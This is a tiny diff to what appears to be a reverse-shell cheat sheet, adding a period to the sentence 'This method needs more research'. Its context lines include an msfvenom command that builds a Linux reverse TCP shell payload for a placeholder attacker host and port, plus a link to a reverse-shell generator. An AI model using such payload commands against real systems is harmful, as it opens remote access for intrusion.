@@ -41,7 +41,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > she
 
 ## Native reverse shells
 
-This method needs more research
+This method needs more research.
 
 ```text
 https://github.com/mthbernardes/rsg
